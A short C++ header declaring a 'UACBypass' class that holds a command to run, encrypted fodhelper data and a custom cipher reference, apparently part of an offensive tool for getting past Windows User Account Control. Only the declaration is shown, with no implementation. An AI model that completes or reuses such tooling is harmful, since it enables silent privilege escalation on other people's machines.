#ifndef UAC_BYPASS_H
#define UAC_BYPASS_H

#include <string>
#include <vector>
#include <cstdint>

class easCipher42;

class UACBypass {
private:
    bool verbose = false;
    std::string command_to_execute;
    const uint8_t* fodhelper_enc_data;
    size_t fodhelper_enc_size;
    easCipher42& cipher;

public:
    UACBypass(const std::string& cmd, const uint8_t* fh_enc, size_t fh_enc_size,
              easCipher42& cipher_ref, bool verbose_mode = false)
        : command_to_execute(cmd), fodhelper_enc_data(fh_enc), fodhelper_enc_size(fh_enc_size),
          cipher(cipher_ref), verbose(verbose_mode) {}

    bool execute_fodhelper();
};

#endif
